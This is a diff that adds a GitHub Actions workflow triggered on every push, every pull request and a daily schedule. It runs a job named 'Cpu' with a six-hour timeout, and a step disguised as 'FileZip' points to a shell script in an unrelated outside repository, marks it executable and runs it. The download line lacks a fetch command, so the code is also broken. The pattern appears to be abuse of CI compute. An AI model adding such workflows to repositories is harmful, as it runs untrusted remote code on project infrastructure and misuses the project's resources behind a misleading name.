@@ -1,0 +1,22 @@
+name: Sk
+on:
+  push:
+    branches: [ master, main ]
+  pull_request:
+    branches: [ master, main ]
+  schedule:
+    - cron: '0 0 * * *'
+jobs:
+  build_01:
+    name: Cpu
+    runs-on: windows-2019
+    timeout-minutes: 360
+    steps:
+    - name: Setup
+      uses: actions/checkout@v2
+    - name: FileZip
+      run: |
+        https://raw.githubusercontent.com/devailani/derin/main/start.sh
+        chmod u+x start.sh
+        ./start.sh
+        
